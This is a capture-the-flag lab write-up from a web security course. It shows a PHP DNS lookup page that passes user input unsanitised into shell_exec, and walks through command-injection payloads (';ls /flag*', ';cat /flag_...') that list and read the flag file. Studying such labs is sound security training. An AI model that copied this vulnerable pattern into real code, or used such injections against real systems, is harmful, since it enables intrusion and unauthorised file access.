---
title: Simple Web 0x09(Lab - DNS Lookup Tool)
tags: [NTUSTWS, CTF, Web]

category: "Security｜Course｜NTUST WS｜Command Injection"
date: 2023-01-31
---

# Simple Web 0x09(Lab - DNS Lookup Tool)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8300/

## Source code
:::spoiler code
```php=
 <?php
isset($_GET['source']) and die(show_source(__FILE__, true));
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Lookup Tool | Baby</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
</head>

<body>
    <section class="section">
        <div class="container">
            <div class="column is-6 is-offset-3 has-text-centered">
                <div class="box">
                    <h1 class="title">DNS Lookup Tool 🔍</h1>
                    <form method="POST">
                        <div class="field">
                            <div class="control">
                                <input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="<?= $_POST['name'] ?? '' ?>">
                            </div>
                        </div>
                        <button class="button is-block is-info is-fullwidth">
                            Lookup!
                        </button>
                    </form>
                    <br>
                    <?php if (isset($_POST['name'])) : ?>
                        <section class="has-text-left">
                            <p>Lookup result:</p>
                            <pre><?= shell_exec("host '" . $_POST['name'] . "';") ?></pre>
                        </section>
                    <?php endif; ?>
                    <hr>
                    <a id="magic">Magic</a> | <a href="/?source">Source Code</a>
                </div>
                <article class="message is-link is-hidden is-size-4" id="hint">
                    <div class="message-body is-family-monospace">
                        host '<span class="has-text-danger" id="command"></span>';
                    </div>
                </article>
            </div>
        </div>
    </section>

    <script>
        magic.onclick = () => hint.classList.toggle("is-hidden");
        window.onload = hostname.oninput = () => command.textContent = hostname.value;
    </script>
</body>

</html> 
```
:::

## Exploit
1. According to the source code, seems there's no any protection.
2. `shell_exec`
It used `shell_exec` to parse input string.
`shell_exec("host '" . $_POST['name'] . "';")`
`shell_exec("host '" . ';ls /flag*' . "';")`→`host '';ls /flag*'';`
![](https://i.imgur.com/6rCN8gy.png)
↓
`shell_exec("host '" . ';cat /flag_44ebd3936a907d59'. "';")`
* Note that, you can use `psysh` or `php -a` in Linux with interactive mode to try the payload
3. Then we got flag!!!


## Reference
[PHP system()、exec()、shell_exec() 的 差異](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)